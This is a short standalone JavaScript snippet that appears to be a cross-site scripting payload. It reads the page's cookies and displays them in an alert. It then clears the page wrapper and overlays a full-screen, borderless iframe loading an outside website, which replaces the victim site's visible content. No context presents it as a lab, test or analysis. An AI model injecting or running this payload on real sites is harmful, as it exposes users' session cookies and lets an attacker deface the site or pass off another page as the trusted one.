var micookie = document.cookie;
alert(micookie);
document.getElementById("page-wrapper").innerHTML= "";
var iframet = document.createElement('iframe');
iframet.src = 'https://www.gruponatividad.com/';
iframet.setAttribute("id", "miiframe");
iframet.setAttribute("style", "overflow:hidden;overflow-x:hidden;overflow-y:hidden;position:absolute;top:0px;left:0px;right:0px;bottom:0px;height:100%;width:100%;");
iframet.frameBorder = 0;
document.getElementById("page-wrapper").appendChild(iframet);
